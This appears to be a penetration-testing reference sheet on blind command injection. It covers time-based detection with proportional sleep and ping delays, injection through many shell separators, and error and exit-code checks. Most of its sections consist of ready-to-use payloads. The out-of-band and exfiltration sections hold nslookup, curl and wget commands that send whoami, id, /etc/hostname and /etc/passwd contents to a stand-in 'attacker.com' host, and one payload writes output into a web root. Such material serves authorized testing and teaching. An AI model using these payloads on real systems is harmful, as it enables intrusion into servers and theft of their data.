# Blind Command Injection Techniques

## When to Use

Consult when command output is not visible in the response. This is the most common scenario — applications process commands server-side but don't return the output to the user.

---

## Time-Based Detection

### Proportional Delay Method (Most Reliable)

**Step 1:** Establish baseline response time (3 measurements, calculate average ± variance).

**Step 2:** Send delay payloads with INCREASING durations:

| Payload | Expected Additional Delay |
|---------|--------------------------|
| `; sleep 0` | 0 seconds (control) |
| `; sleep 3` | ~3 seconds |
| `; sleep 7` | ~7 seconds |
| `; sleep 12` | ~12 seconds |

**Step 3:** If delays are proportional (±1s), command injection is confirmed.

**Why proportional:** Network jitter, server load, and database queries can cause delays. A single 5-second delay could be coincidence. But if `sleep 3` adds 3s AND `sleep 7` adds 7s AND `sleep 12` adds 12s, the only explanation is command execution.

### Windows Timing Commands
```
& ping -n N 127.0.0.1       → Delay of ~N seconds (one ping per second)
& timeout /t N /nobreak      → N second delay
| ping -n N 127.0.0.1
& powershell -c "Start-Sleep N"
```

### Timing Through Different Separators
Test the same delay through ALL separators. Some may be filtered while others pass:
```
valid_input; sleep 5
valid_input | sleep 5
valid_input || sleep 5
valid_input & sleep 5
valid_input && sleep 5
valid_input `sleep 5`
valid_input $(sleep 5)
valid_input %0asleep 5
valid_input %0d%0asleep 5
```

---

## Out-of-Band (OOB) Detection `[EXTERNAL INFRA REQUIRED]`

### DNS Exfiltration (Best — works through firewalls)

DNS queries almost always pass through firewalls. Use unique subdomains for each test:

```bash
# Confirm execution
; nslookup cmdi-test-1234.attacker.com
$(nslookup cmdi-test-1234.attacker.com)
| nslookup cmdi-test-1234.attacker.com
`nslookup cmdi-test-1234.attacker.com`

# Exfiltrate data via DNS
; x=$(whoami); nslookup $x.attacker.com
$(h=$(hostname); nslookup $h.attacker.com)

# Exfiltrate file content (line by line)
; for line in $(cat /etc/hostname); do nslookup $line.attacker.com; done
```

Use Burp Collaborator or interactsh as your DNS listener.

### HTTP Callback

```bash
; curl http://attacker.com/cmdi-confirm
; wget -q http://attacker.com/cmdi-confirm
$(curl http://attacker.com/cmdi-confirm)
| curl http://attacker.com/cmdi-confirm

# With data exfiltration
; curl http://attacker.com/exfil?data=$(whoami)
; curl -d @/etc/hostname http://attacker.com/exfil
; wget --post-data="$(id)" http://attacker.com/exfil
```

### ICMP (Ping)

```bash
; ping -c 1 attacker-ip
```
Monitor with `tcpdump icmp` on your server.

---

## Error-Based Detection

### Conditional Errors
```bash
# If command injection works, this causes a "file not found" error:
; cat /nonexistent_file_12345

# If the application shows different errors for:
# 1. Valid input → normal response
# 2. Invalid input → input validation error
# 3. Injected invalid command → DIFFERENT error (OS-level)
# Then the third error type confirms command execution
```

### Exit Code Based
```bash
# Exit code 0 (success) vs non-zero (failure) may cause different application behavior
; true        → exit code 0
; false       → exit code 1

# If application behavior differs → it's executing the command and checking the exit code
```

---

## Data Exfiltration via Blind Injection

Once blind command injection is confirmed, extract data:

### Via DNS (Character by Character)
```bash
; nslookup $(cat /etc/hostname).attacker.com
; nslookup $(whoami).attacker.com
; nslookup $(cat /etc/passwd | head -1 | base64 | tr '+/=' '-_~').attacker.com
```

### Via HTTP POST
```bash
; curl -X POST -d "$(cat /etc/passwd)" http://attacker.com/exfil
```

### Via File Write + Direct Access
```bash
# Write command output to a web-accessible file
; id > /var/www/html/output.txt
# Then fetch: https://target.com/output.txt
```

### Via Timing (Last Resort)
Extract data bit by bit using conditional delays:
```bash
# If first character of whoami is 'w', sleep 5
; if [ "$(whoami | cut -c1)" = "w" ]; then sleep 5; fi
```
This is extremely slow (1 character per request) but works when nothing else does.
